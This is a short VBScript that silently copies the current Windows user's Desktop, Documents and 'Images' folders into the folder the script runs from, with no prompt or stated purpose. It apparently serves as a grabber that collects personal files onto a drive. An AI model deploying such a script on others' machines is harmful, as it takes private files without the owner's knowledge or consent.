' @author Mqtth3w https://github.com/mqtth3w
' @license GPL-3.0

Option Explicit
Dim fso, destinationPath, username
Set fso = CreateObject("Scripting.FileSystemObject")
username = CreateObject("WScript.Network").UserName
destinationPath = fso.GetParentFolderName(WScript.ScriptFullName)
destinationPath = destinationPath & "\"

fso.CopyFolder "C:\Users\" & username & "\Desktop", destinationPath
fso.CopyFolder "C:\Users\" & username & "\Documents", destinationPath
fso.CopyFolder "C:\Users\" & username & "\Images", destinationPath

Set fso = Nothing

